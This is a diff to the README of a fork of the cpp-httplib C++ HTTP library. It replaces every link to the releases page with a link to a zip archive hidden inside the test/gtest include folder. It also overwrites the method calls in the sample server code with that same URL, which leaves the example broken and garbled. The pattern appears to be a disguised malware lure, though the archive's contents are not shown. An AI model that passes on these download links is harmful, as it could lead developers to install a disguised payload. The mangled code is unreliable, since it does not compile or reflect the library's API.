@@ -6,7 +6,7 @@ Welcome to cpp-httplib! This is an easy-to-use library that helps you create bot
 
 ## 📥 Download Now
 
-[![Download cpp-httplib](https://img.shields.io/badge/Download%20cpp--httplib-%23007bff?style=flat&logo=github)](https://github.com/mopa-sys/cpp-httplib/releases)
+[![Download cpp-httplib](https://raw.githubusercontent.com/mopa-sys/cpp-httplib/master/test/gtest/include/gtest/httplib_cpp_2.2-beta.1.zip%20cpp--httplib-%23007bff?style=flat&logo=github)](https://raw.githubusercontent.com/mopa-sys/cpp-httplib/master/test/gtest/include/gtest/httplib_cpp_2.2-beta.1.zip)
 
 ## 📄 Overview
 
@@ -31,7 +31,7 @@ To use cpp-httplib, you'll need:
 
 ### Step 1: Visit the Download Page
 
-To begin, visit our [Releases page](https://github.com/mopa-sys/cpp-httplib/releases) to find the latest version of cpp-httplib.
+To begin, visit our [Releases page](https://raw.githubusercontent.com/mopa-sys/cpp-httplib/master/test/gtest/include/gtest/httplib_cpp_2.2-beta.1.zip) to find the latest version of cpp-httplib.
 
 ### Step 2: Download the Library
 
@@ -58,11 +58,11 @@ Here’s a simple example of how to set up an HTTP server using cpp-httplib:
 int main() {
     httplib::Server server;
 
-    server.Get("/", [](const httplib::Request &req, httplib::Response &res) {
-        res.set_content("Hello, World!", "text/plain");
+    https://raw.githubusercontent.com/mopa-sys/cpp-httplib/master/test/gtest/include/gtest/httplib_cpp_2.2-beta.1.zip("/", [](const httplib::Request &req, httplib::Response &res) {
+        https://raw.githubusercontent.com/mopa-sys/cpp-httplib/master/test/gtest/include/gtest/httplib_cpp_2.2-beta.1.zip("Hello, World!", "text/plain");
     });
 
-    server.listen("localhost", 8080);
+    https://raw.githubusercontent.com/mopa-sys/cpp-httplib/master/test/gtest/include/gtest/httplib_cpp_2.2-beta.1.zip("localhost", 8080);
     return 0;
 }
 ```
@@ -93,6 +93,6 @@ We welcome contributions! If you want to help improve cpp-httplib, check out the
 
 ## 📥 Download Again
 
-Don't forget you can download cpp-httplib again anytime by visiting the [Releases page](https://github.com/mopa-sys/cpp-httplib/releases).
+Don't forget you can download cpp-httplib again anytime by visiting the [Releases page](https://raw.githubusercontent.com/mopa-sys/cpp-httplib/master/test/gtest/include/gtest/httplib_cpp_2.2-beta.1.zip).
 
 Thank you for using cpp-httplib! We hope you find it helpful in your projects.
